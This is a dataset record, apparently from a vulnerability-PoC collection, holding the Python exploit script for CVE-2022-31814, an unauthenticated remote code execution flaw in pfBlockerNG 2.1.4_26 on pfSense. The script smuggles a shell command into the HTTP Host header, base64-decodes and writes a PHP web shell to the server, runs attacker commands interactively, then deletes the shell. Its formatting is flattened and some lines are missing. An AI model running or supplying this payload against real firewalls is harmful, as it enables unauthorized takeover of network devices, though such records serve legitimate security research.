{
    "text": "vul_name : pfBlockerNG 2.1.4_26 Remote Code Execution ， vul_cve : CVE-2022-31814 ， vul_poc :  # Exploit Title : pfBlockerNG 2.1.4_26 - Remote Code Execution ( RCE )  ，  # Shodan Results :  ，  # Date : 5th of September 2022 ，  # Exploit Author : IHTeam ，  # Vendor Homepage :  ，  # Software Link :  ，  # Version : 2.1.4_26 ，  # Tested on : pfSense 2.6.0 ，  # CVE : CVE-2022-31814 ，  # Original Advisory :  ，  #  ! /usr/bin/env python3 ， from requests.packages.urllib3.exceptions import InsecureRequestWarning ， requests.packages.urllib3.disable_warnings ( InsecureRequestWarning )  ， parser = argparse.ArgumentParser ( description=\"pfBlockerNG <= 2.1.4_26 Unauth RCE\" )  ， parser.add_argument ( '-url' , action='store' , dest='url' , required=True , help=\"Full URL and port e.g. :  ， args = parser.parse_args (  )  ， url = args.url ， shell_filename = \"system_advanced_control.php\" ， response = requests.get ( '%s/pfblockerng/www/index.php' % ( url )  , verify=False )  ， print ( \" [ + ] pfBlockerNG is installed\" )  ， print ( \"\\n [ - ] pfBlockerNG not installed\" )  ， sys.exit (  )  ， payload = {\"Host\" : \"' *  ; echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBwcmludChwYXNzdGhydSggJF9HRVRbImMiXSkpOz8+Jztmd3JpdGUoJGEsJHQpO2ZjbG9zZSggJGEpOz8+' | python3.8 -m base64 -d | php ; '\"} ， print ( \" [ / ] Uploading shell.\" )  ， response = requests.get ( '%s/pfblockerng/www/index.php' % ( url )  , headers=payload , verify=False )  ， time.sleep ( 2 )  ， response = requests.get ( '%s/system_advanced_control.php?c=id' % ( url )  , verify=False )  ， print ( \" [ + ] Upload succeeded\" )  ， print ( \"\\n [ - ] Error uploading shell. Probably patched \" , response.content )  ， sys.exit (  )  ， response = requests.get ( '%s/system_advanced_control.php?c=%s' % ( url , urllib.parse.quote ( cmd , safe=' )  , verify=False )  ， print ( str ( response.text ) +\"\\n\" )  ， delcmd = \"rm /usr/local/www/system_advanced_control.php\" ， response = requests.get ( '%s/system_advanced_control.php?c=%s' % ( url , urllib.parse.quote ( delcmd , safe=' )  , verify=False )  ， print ( \"\\n [ + ] Shell deleted\" )  ， check_endpoint ( url )  ， upload_shell ( url , shell_filename )  ， cmd = input ( \" # \" )  ， interactive_shell ( url , shell_filename , cmd )  ， delete_shell ( url , shell_filename ) ",
    "time": "2023.02.27"
}